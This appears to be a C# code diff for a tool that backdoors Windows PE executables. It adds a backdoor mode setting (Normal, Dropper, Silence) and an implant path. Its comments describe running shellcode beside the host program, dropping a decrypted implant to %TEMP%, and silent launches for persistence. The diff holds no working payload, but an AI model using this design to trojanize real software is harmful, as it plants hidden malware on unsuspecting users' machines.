@@ -55,6 +55,12 @@ public sealed class PeBackdoorOptions
 
     /// <summary>For DLL injection: which export to backdoor.</summary>
     public string? DllExportName { get; set; }
+
+    /// <summary>Backdoor execution mode.</summary>
+    public BackdoorMode Mode { get; set; } = BackdoorMode.Normal;
+
+    /// <summary>Path to the standalone implant EXE to embed (Dropper mode only).</summary>
+    public string? ImplantPath { get; set; }
 }
 
 /// <summary>
@@ -130,6 +136,35 @@ public enum PayloadEncryption
 
     /// <summary>RC4 encryption.</summary>
     Rc4
+}
+
+/// <summary>
+/// Backdoor execution mode controlling how the injected stub behaves at runtime.
+/// </summary>
+public enum BackdoorMode
+{
+    /// <summary>
+    /// Normal: shellcode runs in a CreateThread alongside the host.
+    /// Both host and implant execute on every launch.
+    /// Incompatible with persistence snippets.
+    /// </summary>
+    Normal,
+
+    /// <summary>
+    /// Dropper: host PE carries an encrypted implant EXE in an appended .dpl section.
+    /// At first run the stub decrypts, writes to %TEMP%, and CreateProcessW-launches it,
+    /// then resumes the host OEP. Fully compatible with persistence in the implant.
+    /// </summary>
+    Dropper,
+
+    /// <summary>
+    /// Silence: if the backdoored PE is launched with any argument the shellcode runs
+    /// silently (host UI suppressed). Without arguments the host executes normally while
+    /// the shellcode runs in a background thread.
+    /// Persistence snippets should register the payload with a silence argument
+    /// (configured via the BackdoorConfig/SilenceArg YAML snippet).
+    /// </summary>
+    Silence,
 }
 
 /// <summary>
